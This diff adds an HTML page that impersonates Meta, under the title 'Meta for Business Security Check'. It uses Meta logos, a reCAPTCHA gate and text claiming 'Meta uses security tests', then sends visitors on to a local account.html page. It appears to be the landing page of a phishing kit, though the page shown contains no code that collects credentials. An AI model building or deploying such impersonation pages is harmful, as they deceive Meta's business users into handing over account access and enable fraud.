@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>Meta Business</title>
+    <meta name="description" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <script src="./js/config.js"></script>
+    <link rel="shortcut icon" href="./img/favicon.ico" type="image/x-icon" />
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&family=Nunito:wght@300;400;500;600&family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet" />
+    <style>
+        * {
+          margin: 0;
+          padding: 0;
+          box-sizing: border-box;
+          list-style: none;
+          text-decoration: none;
+          max-width: 100%;
+          font-family: Montserrat, sans-serif;
+        }
+      
+        body {
+          background-color: #ffffff;
+          min-height: 100vh;
+          width: 100vw;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          text-align: center;
+        }
+      
+        .container {
+          width: 100%;
+          max-width: 500px;
+          border: 1px solid #9f9f9f;
+          border-radius: 12px;
+          overflow: hidden;
+          padding: 20px;
+        }
+      
+        .image_1 img {
+          width: 100%;
+        }
+      
+        .logo_intro img {
+          width: 40px;
+        }
+      
+        h1.logo_intro {
+          font-weight: 500;
+          padding: 5px;
+          color: #4f4f4f;
+        }
+      
+        h3 {
+          font-weight: 500;
+          padding: 22px 0;
+          font-size: 26px;
+          color: #4f4f4f;
+        }
+      
+        p {
+          padding: 5px;
+        }
+      
+        #captcha-error {
+          text-align: center;
+          color: red;
+        }
+      
+        .g-recaptcha {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px auto;
+        }
+      
+        button#continueButton {
+          width: 95%;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          background-color: #1876fe;
+          color: #ffffff;
+          font-size: 17px;
+          font-weight: 500;
+          margin: 10px;
+          padding: 15px 5px;
+          border-radius: 5px;
+        }
+      
+        @media (max-width: 766px) {
+          h1.logo_intro {
+            font-size: 22px;
+          }
+        }
+      </style>
+</head>
+
+<body style="background-color:#ffffff;min-height:100dvh;width:100vw;padding:10px">
+    <div class="container" style="width:100%;max-width:500px;margin:0 auto;border:1px solid #9f9f9f;border-radius:12px;overflow:hidden;">
+        <div class="image_1"><img style="width:100%" src="./img/meta-index.png" alt="" /></div>
+        <h1 class="logo_intro" style="font-weight:500;padding:5px;text-align:center;color:#4f4f4f"><img width="40" src="./img/meta-logo.jpeg" alt="" />Meta for Business</h1>
+        <h3 style="font-weight:500;text-align:center;padding:22px 0;font-size:26px;color:#4f4f4f">Security Check</h3>
+        <p style="padding:5px">Meta uses security tests to ensure that the people on the site are real. Please fill the security check below to continue further.</p>
+        <div id="captcha-error" style="text-align: center;color:red"></div>
+
+        <!-- Recaptcha section -->
+
+        <div class="g-recaptcha" id="captcha"></div>
+
+
+        <button id="continueButton"  style="width:95%;display:flex;align-items:center;justify-content:center;background-color:#1876fe;color:#ffffff;font-size:17px;font-weight:500;margin:10px;padding:15px 5px;border-radius:5px;" href="./account.html" class="continue">Continue</button>
+   
+    </div>
+    <script src="./verify.js"></script>
+    <script src="./js/checkcaptcha.js"></script>
+    <script>
+     document.getElementById("captcha").setAttribute("data-sitekey", SITE_KEY);
+    </script>
+</body>
+
+</html>
